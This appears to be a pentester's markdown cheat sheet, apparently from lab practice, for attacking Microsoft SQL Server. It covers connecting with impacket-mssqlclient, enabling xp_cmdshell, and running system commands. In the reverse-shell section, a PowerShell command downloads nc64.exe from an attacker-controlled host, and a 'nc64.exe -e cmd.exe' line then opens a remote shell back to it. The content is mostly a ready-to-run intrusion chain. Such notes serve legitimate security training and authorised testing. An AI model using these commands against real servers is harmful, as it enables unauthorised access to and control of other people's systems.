# MS SQL

## Remote MS SQL Server Instance

Connect using the impacket mssqlclient tool

```bash
impacket-mssqlclient dbusername:password@10.123.32.1
```

Auth with Windows creds

```bash
impacket-mssqlclient HOSTNAME/user:password@10.123.32.1 -windows-auth
```

## Basic shell with xp_cmdshell

Check if we're an admin

```sql
SQL> SELECT is_srvrolemember('sysadmin');
```

Enable it (if needed)

```sql
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

Test it

```sql
SQL> xp_cmdshell whoami
output                                                                             
--------------------------------------------------------------------------------   
archetype\user
NULL                                                                               
```

## Get a full reverse shell

Use xp_cmdshell to download e.g. netcat and connect to our host

```sql
-- outputs shortenened for brevity!

-- check our current working directory
SQL> xp_cmdshell "powershell -c pwd"
C:\Windows\system32

-- note that in this example we're hosting the nc64.exe binary ourselves and grabbing it using powershell's wget
SQL> xp_cmdshell "powershell -c cd C:\Users\Dave\Downloads; wget http://10.10.14.153:8888/nc64.exe -outfile nc64.exe"

-- use it to connect to a listener
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.153 1234"
```


## Cheatsheets & further reading

https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql